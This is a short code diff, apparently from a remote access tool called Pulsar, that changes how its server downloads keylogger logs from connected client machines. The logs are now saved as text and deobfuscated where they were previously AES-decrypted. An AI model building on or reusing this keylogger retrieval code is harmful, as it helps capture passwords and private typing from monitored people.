@@ -121,10 +121,10 @@ namespace Pulsar.Server.Messages
                     return;
                 }
 
-                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
+                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".txt", true);
             }
         }
-
+        
         private void FileTransferUpdated(object sender, FileTransfer transfer)
         {
             if (transfer.Status == "Completed")
@@ -132,14 +132,14 @@ namespace Pulsar.Server.Messages
                 try
                 {
                     _completedTransfers++;
-                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance));
+                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadObfuscatedLogFile(transfer.LocalPath));
                     OnReport(_allTransfers == _completedTransfers
                         ? "Successfully retrieved all logs"
                         : GetDownloadProgress(_allTransfers, _completedTransfers));
                 }
                 catch (Exception)
                 {
-                    OnReport("Failed to decrypt and write logs");
+                    OnReport("Failed to deobfuscate and write logs");
                 }
             }
         }
